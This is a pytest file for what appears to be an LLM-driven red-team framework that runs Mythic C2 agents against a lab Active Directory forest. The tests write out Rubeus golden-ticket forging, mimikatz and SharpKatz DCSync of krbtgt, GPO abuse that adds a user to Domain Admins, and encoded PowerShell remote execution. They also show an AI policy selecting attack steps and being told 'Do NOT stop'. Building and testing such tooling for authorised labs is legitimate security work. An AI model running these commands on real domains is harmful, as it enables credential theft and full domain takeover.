    calls = {"issue": 0}

    async def fake_reconcile(mythic_tools_obj, now):
        return [_foothold(host="CASTELBLACK", forest="north.sevenkingdoms.local")]

    mt = _make_tools()
    mt._engagement_hops = engagement_state.record_hop_result(
        engagement_state.EngagementState(objective="test"),
        "sid-history-escalation",
        "north.sevenkingdoms.local",
        "achieved",
        {"source": "test", "provenance": "durable", "artifact_present": True},
        "2026-06-11T00:00:00Z",
    ).hops
    command = {
        "assembly_name": "Rubeus.exe",
        "assembly_arguments": (
            "golden /user:Administrator /domain:north.sevenkingdoms.local "
            f"/sid:S-1-5-21-111-222-333 /aes256:{'a' * 64} "
            "/sids:S-1-5-21-444-555-666-519 /nowrap"
        ),
    }
    key = mythic_tools._ticket_command_key("execute_assembly", command)
    mt._deterministic_ticket_command_keys.add(key)
    mt._deterministic_ticket_command_contexts[key] = {"capability": "ensure-kerberos-context"}

    with patch.object(access_reconciler, "reconcile_access", fake_reconcile), \
        _split_issue("[*] base64(ticket.kirbi):\n" + "A" * 88, calls, display_id=5151):
        result = asyncio.run(
            mt.issue_task_and_waitfor_task_output(
                "execute_assembly",
                command,
                13,
            )
        )

    assert "base64(ticket.kirbi)" in result
    assert calls["issue"] == 1
    assert len(mt._engagement_hops) == 1


def test_ticket_command_key_canonicalizes_backend_parameter_aliases():
    command_text = (
        "golden /user:Administrator /domain:north.sevenkingdoms.local "
        f"/sid:S-1-5-21-111-222-333 /aes256:{'a' * 64} "
        "/sids:S-1-5-21-444-555-666-519 /nowrap"
    )

    assert mythic_tools._ticket_command_key("execute_assembly", {"assembly_arguments": command_text}) == \
        mythic_tools._ticket_command_key("execute-assembly", {"Arguments": [command_text]})


def test_ticket_command_key_recognizes_managed_asktgt_artifact():
    command_text = f"asktgt /user:alice /domain:lab.local /aes256:{'a' * 64} /nowrap"

    assert mythic_tools._ticket_command_key("execute_assembly", {"assembly_arguments": command_text}) == (
        f"kerberos-tgt:managed-assembly:{command_text}"
    )


def test_ticket_command_key_recognizes_certificate_pkinit_artifact():
    command_text = (
        "asktgt /user:administrator /domain:lab.local "
        "/certificate:C:\\Windows\\Temp\\admin.pfx /password:SageCert! /getcredentials /show /nowrap"
    )
    canonical = command_text.casefold()

    assert mythic_tools._ticket_command_key("execute_assembly", {"assembly_arguments": command_text}) == (
        f"kerberos-pkinit:managed-assembly:{canonical}"
    )


def test_ticket_artifact_extraction_handles_bytes_repr_output():
    mt = _make_tools()
    ticket = base64.b64encode(b"A" * 96).decode()
    output = repr(
        (
            "\r\n[*] base64(ticket.kirbi):\r\n\r\n"
            f"      {ticket}\r\n\r\n"
            "  ServiceName              :  krbtgt/lab.local\r\n"
        ).encode()
    )

    assert mt._extract_kerberos_ticket_base64(output) == ticket


def test_deterministic_ensure_context_service_proof_records_callback_effect():
    mt = _make_tools()

    async def no_schema(command, callback_display_id):
        return []

    async def no_validation(command, parameters, callback_display_id):
        return None

    action = capabilities.CapabilityAction(
        name="ensure-kerberos-context",
        target="domain=sevenkingdoms.local;callback=13;source_domain=north.sevenkingdoms.local",
        preconditions=[
            "da:sevenkingdoms.local",
            "krbtgt-hash:north.sevenkingdoms.local",
            "live-callback:13",
        ],
        effects=["kerberos-context:sevenkingdoms.local@callback:13"],
        intent={
            "capability": "ensure-kerberos-context",
            "domain": "sevenkingdoms.local",
            "source_domain": "north.sevenkingdoms.local",
            "callback_id": "13",
        },
    )
    params = "dir \\\\kingslanding.sevenkingdoms.local\\C$"
    mt._deterministic_capability_command_contexts[
        mythic_tools._capability_command_key("shell", params)
    ] = {
        "capability": "ensure-kerberos-context",
        "target": action.target,
        "effects": list(action.effects),
        "intent": dict(action.intent),
        "action": asdict(action),
        "expected_probe": "extract_ticket_probe",
        "produces": ["kerberos_service_access_probe"],
        "consumes": ["kerberos_ticket_imported", "kerberos_logon_context"],
    }
    mt._fetch_command_schema = no_schema
    mt._validate_command_parameters = no_validation
    output = " Directory of \\\\KINGSLANDING.SEVENKINGDOMS.LOCAL\\C$\r\nWindows\r\n"

    with _split_issue(output, display_id=6161):
        result = asyncio.run(mt.issue_task_and_waitfor_task_output("run", params, 13, timeout=5))

    assert "Directory of" in result
    assert "kerberos-context:sevenkingdoms.local@callback:13" in {
        effect for hop in mt._engagement_hops for effect in hop.satisfied_effects
    }
    hop = mt._engagement_hops[-1]
    assert hop.technique == "capability:ensure-kerberos-context"
    assert hop.evidence["mythic_task_id"] == 6161
    assert hop.evidence["callback_id"] == 13


def test_ticket_gate_blocks_builder_shaped_command_not_emitted_by_builder():
    calls = {"issue": 0}

    async def fake_reconcile(mythic_tools_obj, now):
        return [_foothold(host="CASTELBLACK", forest="north.sevenkingdoms.local")]

    mt = _make_tools()
    mt._engagement_hops = engagement_state.record_hop_result(
        engagement_state.EngagementState(objective="test"),
        "dcsync",
        "north.sevenkingdoms.local",
        "achieved",
        {"source": "test", "provenance": "run", "artifact_present": True},
        "2026-06-11T00:00:00Z",
    ).hops

    with patch.object(access_reconciler, "reconcile_access", fake_reconcile), \
        _split_issue("should not issue", calls):
        result = asyncio.run(
            mt.issue_task_and_waitfor_task_output(
                "mimikatz",
                {
                    "arguments": (
                        "kerberos::golden /user:Administrator /domain:north.sevenkingdoms.local "
                        f"/sid:S-1-5-21-111-222-333 /aes256:{'a' * 64} "
                        "/sids:S-1-5-21-77519052-5f09-44cc-ae0b-23c364c894d0-519 /ptt"
                    )
                },
                8,
            )
        )

    assert "Kerberos ticket command not attempted" in result
    assert "exactly as returned" in result
    assert calls["issue"] == 0


def test_gate_proceed_records_gpo_setup_as_pending_until_system_proof():
    calls = {"issue": 0}

    async def fake_reconcile(mythic_tools_obj, now):
        return []

    mt = _make_tools()
    with patch.object(access_reconciler, "reconcile_access", fake_reconcile), \
        _split_issue("[+] The GPO was modified to include an immediate scheduled task.", calls, display_id=2712):
        result = asyncio.run(
            mt.issue_task_and_waitfor_task_output(
                "execute_assembly",
                "--Assembly SharpGPOAbuse.exe --GPOName NewGPO",
                11,
            )
        )

    assert "[+] The GPO was modified to include an immediate scheduled task." in result
    assert "[SAGE RESULT] GPO setup pending" in result
    assert "wait_for_seconds" in result
    assert "Do NOT stop" in result
    assert calls["issue"] == 1
    assert len(mt._engagement_hops) == 1
    hop = mt._engagement_hops[0]
    assert hop.technique == "gpo-abuse"
    assert hop.target == "newgpo"
    assert hop.status == "pending"
    assert hop.evidence["verify_verdict"] == "partial"
    # The hop must capture the Mythic task display_id that created the setup artifact.
    assert hop.evidence.get("mythic_task_id") == 2712


def test_gate_proceed_annotates_gpo_guid_only_noop():
    calls = {"issue": 0}

    async def fake_reconcile(mythic_tools_obj, now):
        return []

    output = (
        "[+] Domain = north.sevenkingdoms.local\r\n"
        "[+] Domain Controller = winterfell.north.sevenkingdoms.local\r\n"
        "[+] Distinguished Name = CN=Policies,CN=System,DC=north,DC=sevenkingdoms,DC=local\r\n"
        "[+] GUID of \"STARKWALLPAPER\" is: {0A93E998-2599-4DA8-9717-6744993DED3A}\r\n"
    )
    mt = _make_tools()
    with patch.object(access_reconciler, "reconcile_access", fake_reconcile), \
        _split_issue(output, calls, display_id=2713):
        result = asyncio.run(
            mt.issue_task_and_waitfor_task_output(
                "execute_assembly",
                "--Assembly SharpGPOAbuse.exe --GPOName STARKWALLPAPER",
                11,
            )
        )

    assert "Do NOT wait for Group Policy refresh" in result
    assert calls["issue"] == 1
    hop = mt._engagement_hops[0]
    assert hop.technique == "gpo-abuse"
    assert hop.target == "starkwallpaper"
    assert hop.status == "failed"
    assert hop.evidence["verify_verdict"] == "failed"
    assert hop.evidence.get("mythic_task_id") == 2713


def test_record_engagement_success_records_domain_admin_membership_probe():
    mt = _make_tools()
    mt._engagement_footholds = [_foothold(forest="north.sevenkingdoms.local")]
    mt._last_issued_callback_id = 50
    mt._last_issued_task_display_id = 282
    mt._pending_engagement_hop = (
        "domain-admin-membership-check",
        "north.sevenkingdoms.local",
        "2026-06-11T01:10:05Z",
    )
    output = """
Group name     Domain Admins
Members
-------------------------------------------------------------------------------
Administrator            arya
The command completed successfully.
"""

    with patch.object(mt, "_persist_engagement_ledger") as persist:
        mt._record_engagement_success(output)

    persist.assert_called_once()
    assert len(mt._engagement_hops) == 1
    hop = mt._engagement_hops[0]
    assert hop.technique == "domain-admin-membership-check"
    assert hop.effect == "da:north.sevenkingdoms.local"
    assert hop.satisfied_effects == ["da:north.sevenkingdoms.local"]
    assert hop.status == "achieved"
    assert hop.evidence["verified_on_record"] is True
    assert hop.evidence["artifact_present"] is True
    assert hop.evidence["mythic_task_id"] == 282


def test_extract_domain_admin_membership_probe_accepts_net_user_global_group_membership():
    mt = _make_tools()
    mt._engagement_footholds = [
        engagement_state.Foothold(
            callback_id="3",
            agent="merlin",
            host="CASTELBLACK",
            forest="north.sevenkingdoms.local",
            identity="NORTH\\samwell.tarly",
            integrity="medium",
            alive=True,
            source="test",
            timestamp="2026-06-15T20:00:00Z",
        )
    ]
    mt._last_issued_callback_id = 3
    output = """
User name                    samwell.tarly
Global Group memberships     *Night Watch          *Domain Admins
The command completed successfully.
"""

    probe = mt._extract_domain_admin_membership_probe(output)

    assert probe["domain_admin"] is True
    assert probe["group_query_succeeded"] is True
    assert probe["principal_present"] is True
    assert probe["member_of"] == ["Domain Admins"]


def test_record_capability_result_bridge_records_and_persists():
    mt = _make_tools()
    action = capabilities.CapabilityAction(
        name="grant-directory-rights",
        target="domain=lab.local;source=gpo-system-exec:workstation-policy",
        preconditions=[
            "system-exec:gpo:workstation-policy@lab.local",
            "live-foothold:lab.local",
        ],
        effects=["ds-replication-rights:lab.local"],
    )

    with patch.object(mt, "_persist_engagement_ledger") as persist:
        verification = mt.record_capability_result(
            action,
            {"ds_replication_rights": True},
            now="2026-06-10T13:00:00Z",
            evidence={"mythic_task_id": 31337},
        )

    assert verification.verdict == "achieved"
    persist.assert_called_once()
    assert len(mt._engagement_hops) == 1
    hop = mt._engagement_hops[0]
    assert hop.technique == "capability:grant-directory-rights"
    assert hop.status == "achieved"
    assert hop.effect == "ds-replication-rights:lab.local"
    assert hop.evidence["verify_verdict"] == "achieved"
    assert hop.evidence["mythic_task_id"] == 31337


def test_record_graph_built_persists_policy_decision_provenance():
    mt = _make_tools()
    mt._engagement_footholds = [_foothold()]
    token = mythic_tools._task_visibility_context.set({
        "capability": "collect-graph",
        "policy_decision": {
            "episode_id": "episode-collect",
            "decision_id": "decision-collect",
            "policy_mode": "llm",
            "candidate_hash": "sha256:collect",
            "candidate_count": 1,
            "selected_index": 0,
            "selected_family": "collection",
            "selected_is_first_admissible": True,
            "disposition": "select",
            "raw_response": '{"disposition":"select","capability":"collect-graph"}',
            "raw_disposition": "select",
            "raw_rationale": "only legal first step",
            "model_response_observed": True,
            "effective_backend": "runtime-provider:runtime-model",
            "backend_provenance_source": "response_metadata.model_name",
        },
    })
    try:
        with patch.object(mt, "_persist_engagement_ledger") as persist:
            asyncio.run(mt._record_graph_built("50", True, covered_domains=["north.local"]))
    finally:
        mythic_tools._task_visibility_context.reset(token)

    persist.assert_called_once()
    hop = mt._engagement_hops[0]
    assert hop.technique == "collect-graph"
    assert hop.evidence["decision_id"] == "decision-collect"
    assert hop.evidence["selected_family"] == "collection"
    assert hop.evidence["selected_is_first_admissible"] is True
    assert hop.evidence["raw_disposition"] == "select"
    assert hop.evidence["effective_backend"] == "runtime-provider:runtime-model"


def test_build_capability_execution_plan_bridge_delegates_to_pure_builder():
    mt = _make_tools()
    action = capabilities.CapabilityAction(
        name="dcsync-krbtgt",
        target="domain=lab.local;account=krbtgt",
        preconditions=["ds-replication-rights:lab.local", "live-foothold:*"],
        effects=["krbtgt-hash:lab.local"],
        intent={"capability": "dcsync-krbtgt", "domain": "lab.local", "account": "krbtgt"},
    )

    plan = mt.build_capability_execution_plan(action)

    assert plan.ok is True
    assert plan.steps[0].operation == "drsuapi-dcsync"
    assert plan.steps[0].parameters == {"domain": "lab.local", "account": "krbtgt"}


def test_build_capability_execution_plan_bridge_supports_dcsync_account():
    mt = _make_tools()
    action = capabilities.CapabilityAction(
        name="dcsync-account",
        target="domain=lab.local;account=alice",
        preconditions=["ds-replication-rights:lab.local", "live-foothold:*"],
        effects=["creds:alice@lab.local"],
        intent={"capability": "dcsync-account", "domain": "lab.local", "account": "alice"},
    )

    plan = mt.build_capability_execution_plan(action)

    assert plan.ok is True
    assert plan.steps[0].operation == "drsuapi-dcsync"
    assert plan.steps[0].parameters == {"domain": "lab.local", "account": "alice"}


def test_build_capability_commands_exposed_to_mythic_operator():
    mt = _make_tools()
    tools = mt.get_tools(["build_capability_commands"])

    filtered = prompt_loader.filter_tools_by_frontmatter("mythic_operator", tools)

    assert [tool.name for tool in tools] == ["build_capability_commands"]
    assert [tool.name for tool in filtered] == ["build_capability_commands"]


def test_capability_tools_drop_materialize_keep_execute_and_build_for_operator():
    mt = _make_tools()
    tools = mt.get_tools(["execute_capability", "materialize_capability_inputs", "build_capability_commands"])

    filtered = prompt_loader.filter_tools_by_frontmatter("mythic_operator", tools)

    # All three methods can still be built as tools...
    assert [tool.name for tool in tools] == [
        "execute_capability",
        "materialize_capability_inputs",
        "build_capability_commands",
    ]
    # ...but materialize_capability_inputs is intentionally NOT exposed to the operator
    # (execute_capability calls it internally); only execute + build survive the frontmatter filter.
    assert [tool.name for tool in filtered] == [
        "execute_capability",
        "build_capability_commands",
    ]


def test_build_capability_commands_bridge_uses_mythic_adapter():
    mt = _make_tools()
    action = capabilities.CapabilityAction(
        name="dcsync-krbtgt",
        target="domain=lab.local;account=krbtgt",
        preconditions=["ds-replication-rights:lab.local", "live-foothold:*"],
        effects=["krbtgt-hash:lab.local"],
        intent={"capability": "dcsync-krbtgt", "domain": "lab.local", "account": "krbtgt"},
    )

    plan = json.loads(asyncio.run(mt.build_capability_commands(action)))

    assert plan["ok"] is True
    assert plan["commands"][0]["command"] == "dcsync"
    assert plan["commands"][0]["parameters"] == {"domain": "lab.local", "user": "krbtgt"}

    fallback = json.loads(asyncio.run(mt.build_capability_commands(action, {"executor": "mimikatz"})))
    assert fallback["ok"] is True
    assert fallback["commands"][0]["command"] == "mimikatz"
    assert fallback["commands"][0]["parameters"] == {
        "commands": '"lsadump::dcsync /domain:lab.local /user:LAB\\krbtgt"',
    }


@pytest.mark.parametrize(
    ("payload_type", "expected_commands", "expected_parameters"),
    [
        (
            "merlin",
            ["load-assembly", "invoke-assembly"],
            [
                {"filename": "SharpKatz.exe"},
                {
                    "assembly": "SharpKatz.exe",
                    "arguments": "--Command dcsync --User LAB\\krbtgt --Domain lab.local",
                },
            ],
        ),
        (
            "apollo",
            ["dcsync"],
            [{"domain": "lab.local", "user": "krbtgt"}],
        ),
    ],
)
def test_build_capability_commands_selects_adapter_from_callback_payload_type(
    monkeypatch,
    payload_type,
    expected_commands,
    expected_parameters,
):
    mt = _make_tools()
    action = capabilities.CapabilityAction(
        name="dcsync-krbtgt",
        target="domain=lab.local;account=krbtgt;callback=7",
        preconditions=["ds-replication-rights:lab.local", "live-foothold:*"],
        effects=["krbtgt-hash:lab.local"],
        intent={
            "capability": "dcsync-krbtgt",
            "domain": "lab.local",
            "account": "krbtgt",
            "callback_id": "7",
        },
    )

    async def fake_payload_type(callback_id):
        assert callback_id == 7
        return payload_type

    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)

    plan = json.loads(asyncio.run(mt.build_capability_commands(action)))

    assert plan["ok"] is True
    assert [command["command"] for command in plan["commands"]] == expected_commands
    assert [command["parameters"] for command in plan["commands"]] == expected_parameters
    if payload_type == "merlin":
        assert plan["commands"][0]["expected_probe"] == ""
        assert plan["commands"][1]["expected_probe"] == "extract_dcsync_secret_probe"


def test_build_capability_commands_preserves_explicit_mythic_adapter_over_payload_profile(monkeypatch):
    mt = _make_tools()
    action = capabilities.CapabilityAction(
        name="dcsync-krbtgt",
        target="domain=lab.local;account=krbtgt;callback=7",
        preconditions=["ds-replication-rights:lab.local", "live-foothold:*"],
        effects=["krbtgt-hash:lab.local"],
        intent={
            "capability": "dcsync-krbtgt",
            "domain": "lab.local",
            "account": "krbtgt",
            "callback_id": "7",
        },
    )

    async def fake_payload_type(callback_id):
        assert callback_id == 7
        return "merlin"

    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)

    plan = json.loads(asyncio.run(mt.build_capability_commands(action, {
        "mythic_adapter": {
            "drsuapi_command": "custom_dcsync",
            "drsuapi_domain_param": "realm",
            "drsuapi_user_param": "principal",
        },
    })))

    assert plan["ok"] is True
    assert plan["commands"][0]["command"] == "custom_dcsync"
    assert plan["commands"][0]["parameters"] == {
        "realm": "lab.local",
        "principal": "krbtgt",
    }


def test_build_capability_commands_merges_runtime_overrides_into_auto_bound_payload_profile(monkeypatch):
    mt = _make_tools()

    async def fake_payload_type(callback_id):
        assert callback_id == 13
        return "merlin"

    async def fake_fetch_credentials(now):
        return [
            {
                "id": 91,
                "account": "Administrator",
                "realm": "ws01",
                "type": "plaintext",
                "credential_text": "CorrectHorseBatteryStaple!",
                "comment": "managed local admin password for ws01",
            },
        ]

    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)
    mt._fetch_credentials_cached = fake_fetch_credentials

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {
            "capability": "execute-as-local-admin",
            "target_host": "ws01",
            "target_domain": "child.lab.local",
            "callback_id": "13",
        },
        {
            "native_remote_exec_wait_seconds": "11",
        },
    )))

    assert plan["ok"] is True
    assert [command["command"] for command in plan["commands"]] == ["rev2Self", "run"]
    assert plan["commands"][0]["parameters"] == {}
    assert plan["commands"][1]["parameters"]["executable"] == "powershell.exe"
    encoded = plan["commands"][1]["parameters"]["arguments"].rsplit(" ", 1)[1]
    script = base64.b64decode(encoded).decode("utf-16le")
    assert "Start-Sleep -Seconds 11" in script
    assert plan["commands"][1]["expected_probe"] == "extract_remote_execution_probe"


def test_probe_authentication_context_uses_merlin_collection_profile(monkeypatch):
    mt = _make_tools()
    calls = []
    token_output = (
        "Process (Primary) Token:\n"
        "\tUser: NORTH\\samwell.tarly,Token ID: 0x1,Logon ID: 0x123,Privilege Count: 1,"
        "Group Count: 1,Type: Primary,Impersonation Level: Anonymous,Integrity Level: High\n"
        "Thread (Primary) Token:\n"
        "\tUser: NORTH\\samwell.tarly,Token ID: 0x2,Logon ID: 0x123,Privilege Count: 1,"
        "Group Count: 1,Type: Primary,Impersonation Level: Anonymous,Integrity Level: High"
    )

    async def fake_issue(command, parameters, callback_display_id, **_kwargs):
        calls.append((command, parameters, callback_display_id))
        return token_output

    monkeypatch.setattr(mt, "issue_task_and_waitfor_task_output", fake_issue)

    context = asyncio.run(mt.probe_authentication_context(
        7,
        host="castelblack",
        adapter=mythic_capability_adapter.MERLIN_MYTHIC_ADAPTER,
        known_domain_authorities={"north.sevenkingdoms.local"},
    ))

    assert calls == [("token", {"method": "whoami"}, 7)]
    assert context.active_identity == "NORTH\\samwell.tarly"
    assert context.current_luid == "0x123"
    assert context.domain_capable is True


def test_gpo_fallback_group_add_uses_membership_proof_without_proof_file():
    mt = _make_tools()
    action = capabilities.CapabilityAction(
        name="gpo-controlled-system-exec",
        target="gpo=workstation-policy;domain=lab.local",
        preconditions=[
            "generic-write:gpo:workstation-policy",
            "gpo-domain:workstation-policy:lab.local",
            "live-foothold:lab.local",
        ],
        effects=["system-exec:gpo:workstation-policy@lab.local"],
        intent={
            "capability": "gpo-controlled-system-exec",
            "gpo": "workstation-policy",
            "domain": "lab.local",
        },
    )
    plan = json.loads(asyncio.run(mt.build_capability_commands(action, {
        "method": "gpp-immediate-task-fallback",
        "command": "cmd.exe",
        "arguments": r'/c net group "Domain Admins" LAB\alice /add /domain',
    })))
    assert plan["ok"] is True
    assert [command["command"] for command in plan["commands"]] == [
        "execute_assembly",
        "wait_for_seconds",
        "shell",
    ]
    assert plan["commands"][0]["parameters"]["assembly_name"] == "SharpGPOAbuse.exe"
    assert 'alice /add /domain' in plan["commands"][0]["parameters"]["assembly_arguments"]
    assert 'LAB\\alice' not in plan["commands"][0]["parameters"]["assembly_arguments"]
    assert "gpupdate /force" not in json.dumps(plan["commands"])
    assert plan["commands"][1]["parameters"]["seconds"] == 300
    assert plan["commands"][2]["parameters"] == 'net group "Domain Admins" /domain'
    assert plan["commands"][2]["expected_probe"] == "extract_gpo_domain_admin_membership_probe"
    assert plan["commands"][-1]["expected_probe"] == "extract_gpo_domain_admin_membership_probe"
    assert all(
        command["parameters"] != r"C:\Users\Public\sage_gpo_workstation_policy_whoami.txt"
        for command in plan["commands"]
    )


def test_build_capability_commands_gpo_fallback_uses_action_intent_when_inputs_are_sparse():
    mt = _make_tools()

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {
            "capability": "gpo-controlled-system-exec",
            "domain": "north.sevenkingdoms.local",
            "gpo": "STARKWALLPAPER",
            "method": "gpp-immediate-task-fallback",
            "gpo_guid": "{0A93E998-2599-4DA8-9717-6744993DED3A}",
            "task_name": "SageGpoMarkerPublic02",
            "command": "cmd.exe",
            "arguments": r"/c whoami > C:\Users\Public\sage_gpo_marker_public02.txt",
            "proof_path": r"C:\Users\Public\sage_gpo_marker_public02.txt",
            "allow_proof_only": True,
            "callback_id": 3,
        },
        {"callback_id": 3},
    )))

    assert plan["ok"] is True
    assert [command["command"] for command in plan["commands"]] == ["powerpick", "wait_for_seconds", "shell"]
    writer_script = plan["commands"][0]["parameters"]
    assert "$gpoGuidInput = '{0A93E998-2599-4DA8-9717-6744993DED3A}'" in writer_script
    assert "$taskName = 'GpoMarkerPublic02'" in writer_script
    assert "SageGpoMarkerPublic02" not in writer_script
    assert r"C:\Users\Public\sage_gpo_marker_public02.txt" in writer_script
    assert "gpupdate /force" not in json.dumps(plan["commands"])
    assert plan["commands"][-1]["parameters"] == r"type C:\Users\Public\sage_gpo_marker_public02.txt"


def test_build_capability_commands_gpo_fallback_accepts_gpo_aliases():
    mt = _make_tools()

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {
            "capability": "gpo-controlled-system-exec",
            "domain": "north.sevenkingdoms.local",
            "gpo_name": "STARKWALLPAPER",
            "method": "gpp-immediate-task-fallback",
            "allow_proof_only": True,
            "dc_refresh_wait_seconds": 9,
            "callback_id": 3,
        },
        {"callback_id": 3},
    )))

    assert plan["ok"] is True
    assert [command["command"] for command in plan["commands"]] == ["powerpick", "wait_for_seconds", "shell"]
    assert "$gpoName = 'starkwallpaper'" in plan["commands"][0]["parameters"]
    assert "gpupdate /force" not in json.dumps(plan["commands"])
    assert plan["commands"][1]["parameters"]["seconds"] == 9


def test_build_capability_commands_gpo_fallback_augments_guid_from_graph_facts():
    mt = _make_tools()
    mt._engagement_footholds = [
        engagement_state.Foothold(
            callback_id="3",
            agent="apollo",
            host="CASTELBLACK",
            forest="north.sevenkingdoms.local",
            identity="NORTH\\samwell.tarly",
            integrity="medium",
            alive=True,
            source="test",
            timestamp="2026-06-15T20:00:00Z",
        )
    ]
    mt._engagement_graph_facts = [
        engagement_state.GraphFact(
            "gpo-guid:starkwallpaper:0a93e998-2599-4da8-9717-6744993ded3a",
            "bloodhound:cypher",
            "2026-06-15T20:00:00Z",
            600,
        ),
        engagement_state.GraphFact(
            "gpo-affects-dc:starkwallpaper:winterfell:north.sevenkingdoms.local",
            "bloodhound:cypher",
            "2026-06-15T20:00:00Z",
            600,
        ),
    ]

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {
            "capability": "gpo-controlled-system-exec",
            "domain": "north.sevenkingdoms.local",
            "gpo": "starkwallpaper",
            "method": "gpp-immediate-task-fallback",
            "allow_proof_only": True,
            "callback_id": 3,
        },
        {"callback_id": 3},
    )))

    assert plan["ok"] is True
    assert [command["command"] for command in plan["commands"]] == ["powerpick", "wait_for_seconds", "shell"]
    writer_script = plan["commands"][0]["parameters"]
    assert "$gpoGuidInput = '0a93e998-2599-4da8-9717-6744993ded3a'" in writer_script
    assert "$ldapServer = 'winterfell.north.sevenkingdoms.local'" in writer_script


def test_build_capability_commands_dc_scoped_gpo_overrides_initial_fallback_whoami():
    mt = _make_tools()
    mt._engagement_footholds = [
        engagement_state.Foothold(
            callback_id="3",
            agent="apollo",
            host="CASTELBLACK",
            forest="north.sevenkingdoms.local",
            identity="NORTH\\samwell.tarly",
            integrity="medium",
            alive=True,
            source="test",
            timestamp="2026-06-15T20:00:00Z",
        )
    ]
    mt._engagement_graph_facts = [
        engagement_state.GraphFact(
            "gpo-guid:starkwallpaper:0a93e998-2599-4da8-9717-6744993ded3a",
            "bloodhound:cypher",
            "2026-06-15T20:00:00Z",
            600,
        ),
        engagement_state.GraphFact(
            "gpo-affects-dc:starkwallpaper:winterfell:north.sevenkingdoms.local",
            "bloodhound:cypher",
            "2026-06-15T20:00:00Z",
            600,
        ),
    ]

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {
            "capability": "gpo-controlled-system-exec",
            "domain": "north.sevenkingdoms.local",
            "gpo": "starkwallpaper",
            "method": "gpp-immediate-task-fallback",
            "command": "cmd.exe",
            "arguments": r"/c whoami > C:\Users\Public\starkwallpaper_system_proof.txt",
            "callback_id": 3,
        },
        {"callback_id": 3},
    )))

    assert plan["ok"] is True
    assert [command["command"] for command in plan["commands"]] == [
        "execute_assembly",
        "shell",
        "wait_for_seconds",
        "shell",
    ]
    assert all(command["command"] != "powerpick" for command in plan["commands"])
    args = plan["commands"][0]["parameters"]["assembly_arguments"]
    assert "--AddComputerTask" in args
    assert "--GPOName starkwallpaper" in args
    assert r'net group \"Domain Admins\" samwell.tarly /add /domain' in args
    assert "whoami" not in args
    assert plan["commands"][-1]["parameters"] == 'net group "Domain Admins" /domain'
    assert plan["commands"][-1]["expected_probe"] == "extract_gpo_domain_admin_membership_probe"


def test_build_capability_commands_dc_scoped_sparse_gpo_defaults_to_group_add():
    mt = _make_tools()
    mt._engagement_footholds = [
        engagement_state.Foothold(
            callback_id="3",
            agent="apollo",
            host="CASTELBLACK",
            forest="north.sevenkingdoms.local",
            identity="NORTH\\samwell.tarly",
            integrity="medium",
            alive=True,
            source="test",
            timestamp="2026-06-15T20:00:00Z",
        )
    ]
    mt._engagement_graph_facts = [
        engagement_state.GraphFact(
            "gpo-guid:starkwallpaper:0a93e998-2599-4da8-9717-6744993ded3a",
            "bloodhound:cypher",
            "2026-06-15T20:00:00Z",
            600,
        ),
        engagement_state.GraphFact(
            "gpo-affects-dc:starkwallpaper:winterfell:north.sevenkingdoms.local",
            "bloodhound:cypher",
            "2026-06-15T20:00:00Z",
            600,
        ),
    ]

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {
            "capability": "gpo-controlled-system-exec",
            "domain": "north.sevenkingdoms.local",
            "gpo": "starkwallpaper",
            "callback_id": 3,
        },
        {"callback_id": 3},
    )))

    assert plan["ok"] is True
    assert [command["command"] for command in plan["commands"]] == [
        "execute_assembly",
        "shell",
        "wait_for_seconds",
        "shell",
    ]
    args = plan["commands"][0]["parameters"]["assembly_arguments"]
    assert r'net group \"Domain Admins\" samwell.tarly /add /domain' in args
    assert "whoami" not in args
    assert plan["commands"][-1]["parameters"] == 'net group "Domain Admins" /domain'
    assert plan["commands"][-1]["expected_probe"] == "extract_gpo_domain_admin_membership_probe"


def test_gpo_proof_target_defaults_to_sysvol_when_current_callback_not_affected_host(monkeypatch):
    monkeypatch.setenv("SAGE_GPO_PROOF_SHARE_NAME", "SageProof")
    monkeypatch.setenv("SAGE_GPO_PROOF_LOCAL_ROOT", r"C:\SageProof")
    mt = _make_tools()
    mt._engagement_footholds = [
        engagement_state.Foothold(
            callback_id="3",
            agent="apollo",
            host="CASTELBLACK",
            forest="north.sevenkingdoms.local",
            identity="NORTH\\samwell.tarly",
            integrity="medium",
            alive=True,
            source="test",
            timestamp="2026-06-15T20:00:00Z",
        )
    ]
    action = capabilities.CapabilityAction(
        name="gpo-controlled-system-exec",
        target="gpo=starkwallpaper;domain=north.sevenkingdoms.local",
        preconditions=[],
        effects=["system-exec:gpo:starkwallpaper@north.sevenkingdoms.local"],
        intent={
            "capability": "gpo-controlled-system-exec",
            "domain": "north.sevenkingdoms.local",
            "gpo": "starkwallpaper",
            "gpo_guid": "0a93e998-2599-4da8-9717-6744993ded3a",
            "affected_dc_hosts": ["winterfell"],
        },
    )
    inputs = {"callback_id": 3}

    asyncio.run(mt._augment_capability_runtime_inputs(action, inputs))
    asyncio.run(mt._ensure_capability_executor_proof_target(action, inputs))

    assert inputs["current_host"] == "CASTELBLACK"
    assert inputs["proof_path"] == (
        r"\\north.sevenkingdoms.local\SYSVOL\north.sevenkingdoms.local\Policies"
        r"\{0a93e998-2599-4da8-9717-6744993ded3a}"
        r"\Machine\Preferences\ScheduledTasks\sage_gpo_starkwallpaper_whoami.txt"
    )


def test_gpo_proof_target_uses_dedicated_share_for_remote_non_dc_host(monkeypatch):
    monkeypatch.setenv("SAGE_GPO_PROOF_SHARE_NAME", "SageProof")
    monkeypatch.setenv("SAGE_GPO_PROOF_LOCAL_ROOT", r"C:\SageProof")
    mt = _make_tools()
    mt._engagement_footholds = [
        engagement_state.Foothold(
            callback_id="3",
            agent="apollo",
            host="WS01",
            forest="range.local",
            identity=r"RANGE\user1",
            integrity="medium",
            alive=True,
            source="test",
            timestamp="2026-07-12T20:00:00Z",
        )
    ]
    action = capabilities.CapabilityAction(
        name="gpo-controlled-system-exec",
        target="gpo=srv02-policy;domain=range.local",
        preconditions=[],
        effects=["system-exec:gpo:srv02-policy@range.local"],
        intent={
            "capability": "gpo-controlled-system-exec",
            "domain": "range.local",
            "gpo": "srv02-policy",
            "affected_hosts": ["srv02"],
            "affected_dc_hosts": [],
        },
    )
    inputs = {"callback_id": 3}

    asyncio.run(mt._augment_capability_runtime_inputs(action, inputs))
